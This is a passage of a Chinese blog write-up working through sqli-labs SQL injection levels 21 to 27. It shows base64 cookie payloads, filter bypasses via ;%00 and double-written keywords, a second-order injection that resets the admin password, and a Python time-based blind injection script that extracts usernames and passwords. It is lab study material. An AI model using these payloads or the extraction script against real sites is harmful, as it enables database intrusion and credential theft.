class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>看到cookie中uname明显不是用来登录的admin,是admin经过base64加密后的字符</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D<br></code></pre></td></tr></table></figure><p>用赛博厨子解出来尽然是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">YWRtaW4%3D<br>decode base64=<br>admin7<br></code></pre></td></tr></table></figure><p>怀疑是后面%3D是url字符，<br>将构建好的闭合点加密成base64后再上传</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">YWRtaW4n<br>回显<br>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1<br></code></pre></td></tr></table></figure><p>最后测出闭合语句</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">uname=YWRtaW4nKSM=<br>base解码就是<br>uname=admin&#x27;)#<br></code></pre></td></tr></table></figure><p>最后payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoaWQsdXNlcm5hbWUsJyEnLHBhc3N3b3JkKSBmcm9tIHVzZXJzIw==<br></code></pre></td></tr></table></figure><h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><p>和上题解法一样，就是换了闭合点   </p><p>最终payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=IiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChpZCx1c2VybmFtZSwnIScscGFzc3dvcmQpIGZyb20gdXNlcnMj<br></code></pre></td></tr></table></figure><h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>看题目，<br>strip comment,看翻译是删除注释，不懂啥意思<br>看一眼网页源码，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">reg = <span class="hljs-string">&quot;/#/&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">reg1 = <span class="hljs-string">&quot;/--/&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">replace = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><br></code></pre></td></tr></table></figure><p>闭合点是’<br>但好像把#,–,这种注释给替换成空字符了，<br>有没有不用注释的方法呢，<br>注释的作用是把后面的语句无效化。<br>那试试绕过？双写绕过试试？<br>不行，实在试不出来，去看博客吧  </p><h2 id="采用闭合的方式："><a href="#采用闭合的方式：" class="headerlink" title="采用闭合的方式："></a>采用闭合的方式：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-string">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;</span> <br></code></pre></td></tr></table></figure><p>好像是拼入源码会变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><p>对比</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27;union select #&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">//若此出注释符被过滤,则会多出一个单引号导致无法注入</span><br><span class="hljs-comment">//被过滤后的结果</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27;union select&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="采用-00替换注释"><a href="#采用-00替换注释" class="headerlink" title="采用;%00替换注释"></a>采用;%00替换注释</h2><p>采用;%00替换注释：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;;<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure><blockquote><p>%00 是 URL 编码的空字符（\x00）  </p></blockquote><p>组合 ;%00 的完整逻辑<br>攻击者通过 ;%00 实现以下目标：</p><blockquote><p>结束当前语句：分号 ; 终止 UNION SELECT 查询。</p></blockquote><blockquote><p>截断后续内容：空字符 %00 让后端忽略原查询中可能存在的其他条件（如 LIMIT 1 或 AND 子句）。</p></blockquote><blockquote><p>绕过闭合引号：如果原查询的闭合引号在空字符后被截断，可能避免语法错误。</p></blockquote><p>最后payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-string">&#x27; union select 1,2,group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users;%00</span><br></code></pre></td></tr></table></figure><h1 id="less-24-二次注入"><a href="#less-24-二次注入" class="headerlink" title="less 24 二次注入"></a>less 24 二次注入</h1><blockquote><p>二次注入<br>二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。</p></blockquote><h2 id="看别的大佬博客"><a href="#看别的大佬博客" class="headerlink" title="看别的大佬博客"></a>看别的大佬博客</h2><p>在注册新用户中注册已有的用户名会提示不行，但是username没有被过滤，可从username下手。   </p><p>我们先注册一个账号名叫admin’#。可以看到我们成功将有污染的数据写入数据库。单引号是为了和之后密码修的用户名的单引号进行闭合，#是为了注释后面的数据。</p><p>之后也用户名admin’#和密码是123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是111111，可以看到密码修改成功。  </p><p>当我们数据库查看的时候发现修改的是管理员的密码。而不是我们的注册账户的密码。  </p><blockquote><p>我的总结理解是在注册新用户时把有污染的数据写入数据库，当再修改admin’#时会直接把admin’#拼入修改的查询语句，而注释掉了原来验证原账号密码的部分</p></blockquote><p>原语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br></code></pre></td></tr></table></figure><p>当登录admin’#并点修改密码时会出现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;1234&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br></code></pre></td></tr></table></figure><p>这样就会变成修改admin的密码而不是admin’#的，并且会将后面验证admin密码的部分注释掉。</p><hr><h2 id="title-note-12date-2025-03-13-18-58-13tags-sql-labs"><a href="#title-note-12date-2025-03-13-18-58-13tags-sql-labs" class="headerlink" title="title: note-12date: 2025-03-13 18:58:13tags: sql-labs"></a>title: note-12<br>date: 2025-03-13 18:58:13<br>tags: sql-labs</h2><h1 id="less-25-字符过滤绕过"><a href="#less-25-字符过滤绕过" class="headerlink" title="less-25 字符过滤绕过"></a>less-25 字符过滤绕过</h1><p>由题目可知道过滤了or和and，大小写没用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//strip out OR (non case sensitive)</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out AND (non case sensitive)</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>i表示不敏感大小写，这样的话想用报错注入就要进行绕过了  </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">and可以用<span class="hljs-meta">&amp;&amp;</span><br>or可以用<span class="hljs-string">||</span><br></code></pre></td></tr></table></figure><p>也有双写绕过</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">输入<br>oorr<br>进行过滤后会变成<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword"></span>实现绕过<br><br>同理<br>输入aandnd<br>经过过滤变成<br><span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure><p>当然可以直接用联合注入法：<br>注意要绕过字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs payload">?id=&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+<br><br>?id=&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; aandnd table_schema=&#x27;security&#x27;--+<br><br>information要换成infoorrmation。<br>and要换成&amp;&amp;或者aandnd。<br></code></pre></td></tr></table></figure><p>最后payload</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,&#x27;!&#x27;,passwoorrd) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br><br>passsword要换成passwoord<br></code></pre></td></tr></table></figure><h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>要求使用盲注，而且像上题一样过滤or和and，<br>测试了好一会，发现根本不需要闭合  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <br></code></pre></td></tr></table></figure><p>题目可以直接联合注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,passwoorrd) <span class="hljs-keyword">from</span> users <br></code></pre></td></tr></table></figure><p>但是本意应该是让练习盲注的，所以修改了一下以前的脚本<br>时间盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 导入requests库，用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> time      <span class="hljs-comment"># 导入time库，用于测量时间延迟</span><br><br><span class="hljs-comment"># 定义一个包含可能字符的字符串，用于猜测数据库、表和字段的名称</span><br>ALPHABET = <span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br><br><span class="hljs-comment"># 定义一个时间延迟，用于判断是否存在SQL注入</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 定义目标URL，其中包含一个SQL注入的payload模板</span><br><span class="hljs-comment"># &#123;sql&#125;：表示要执行的SQL查询</span><br><span class="hljs-comment"># &#123;position&#125;：表示当前猜测的字符位置</span><br><span class="hljs-comment"># &#123;char&#125;：表示当前猜测的字符</span><br><span class="hljs-comment"># &#123;time&#125;：表示延迟时间</span><br>URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-25a/?id=1 aandnd if(substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(&#123;time&#125;),1)--+&quot;</span><br><br><span class="hljs-comment"># 定义一个函数，用于发送HTTP请求并判断是否存在延迟</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()  <span class="hljs-comment"># 记录请求开始时间</span><br>    response = requests.get(path)  <span class="hljs-comment"># 发送HTTP GET请求</span><br>    end = time.time()   <span class="hljs-comment"># 记录请求结束时间</span><br>    <span class="hljs-comment"># 如果响应状态码为200且响应时间超过预设的延迟时间，则认为存在SQL注入</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 定义一个函数，用于提取数据库、表、字段或数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 初始化一个空字符串，用于存储结果</span><br>    position = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化字符位置计数器</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span>  <span class="hljs-comment"># 每次循环增加字符位置</span><br>        <span class="hljs-comment"># 尝试猜测当前字符位置是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 如果为空，退出循环</span><br>        <span class="hljs-comment"># 遍历所有可能的字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            <span class="hljs-comment"># 构造完整的URL并发送请求</span><br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char  <span class="hljs-comment"># 如果猜测正确，将字符添加到结果字符串中</span><br>                <span class="hljs-keyword">break</span>      <span class="hljs-comment"># 退出循环，继续下一个字符</span><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 返回最终结果字符串</span><br><br><span class="hljs-comment"># 获取数据库名</span><br>database = extract_data(<span class="hljs-string">&quot;database()&quot;</span>)<br><span class="hljs-built_in">print</span>(database)  <span class="hljs-comment"># 调用extract_data函数，传入SQL查询语句获取数据库名</span><br><br><span class="hljs-comment"># 获取表名</span><br>tables = extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;%s&#x27;&quot;</span> % database)<br><span class="hljs-built_in">print</span>(tables)<br><br><span class="hljs-comment"># 获取字段名</span><br>columns = extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(columns)<br><br><span class="hljs-comment"># 获取用户名和密码，可以替换自己想要的表名</span><br><span class="hljs-comment">#all = extract_data(&quot;select group_concat(id,username,password) from users&quot;)</span><br><span class="hljs-comment">#print(all)</span><br></code></pre></td></tr></table></figure><h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//strip out OR (non <span class="hljs-keyword">case</span> sensitive)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out AND (non <span class="hljs-keyword">case</span> sensitive)</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//strip out /*</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out --</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out <span class="hljs-comment">#</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out spaces</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);//Strip out slashes</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></code></pre></td></tr></table></figure><p>\s &#x3D; 空格<br>大概就是空格，制表符，换行符都过滤了,  </p><blockquote><p>注释可以用;%00<br>空格绕过%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格空格，但是可能是apache解析不了(我用的也是apache)，博客上都选择报错注入加()绕过空格,就不用考虑空格<br>or 可以用 || 或 oorr<br>and 可以用 &amp;&amp; 或 aandnd  </p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">||</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(concat(username,<span class="hljs-operator">%</span><span class="hljs-number">27</span>:<span class="hljs-operator">%</span><span class="hljs-number">27</span>,passwoorrd))<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>(users)<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">where</span>(id<span class="hljs-operator">=</span><span class="hljs-number">1</span>))));<span class="hljs-operator">%</span><span class="hljs-number">00</span> <br><span class="hljs-operator">=</span><br><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(select(concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password))from(users)where(id=1))));</span><br><span class="hljs-string"></span><br><span class="hljs-string">https://blog.csdn.net/2301_76913435/article/details/145601627</span><br></code></pre></td></tr></table></figure><p>其中包含：双写or，;%00绕过注释符号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.cnblogs.com<span class="hljs-operator">/</span>linfangnan<span class="hljs-operator">/</span>p<span class="hljs-operator">/</span><span class="hljs-number">13940107.</span>html<br></code></pre></td></tr></table></figure><p>其中包含：双写or，||’1’&#x3D;’1’ 来闭合语句使得不用注释，security.users来确定是security下的users</p><hr><h2 id="title-note-13date-2025-03-15-01-06-35tags-sql-labs"><a href="#title-note-13date-2025-03-15-01-06-35tags-sql-labs" class="headerlink" title="title: note-13date: 2025-03-15 01:06:35tags: sql-labs"></a>title: note-13<br>date: 2025-03-15 01:06:35<br>tags: sql-labs</h2><h1 id="less26a"><a href="#less26a" class="headerlink" title="less26a"></a>less26a</h1><p>网上博客是说用%a0来代替空格，但是我这环境好像解析不了，<br>也不能用报错注入。<br>最后试出来能用来盲注的payload就是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;)||if(length(database())=8,1,0);%00</span><br></code></pre></td></tr></table></figure><p>结果牛大b了，在后面27在同样过滤了空格的情况下用其它如%a0能正确解析,可能是我的关卡文件有问题；<br>那不管了，直接做less27。  </p><h1 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h1><p>这题过滤对大小写没考虑，可以直接大小写绕过<br>题目好像把符号过滤了，用id&#x3D;-1会变成1，注意要用数据库没用的值<br>题目过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out UNION</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out SELECT</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out Union</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out select</span><br><span class="hljs-keyword">return</span> <span 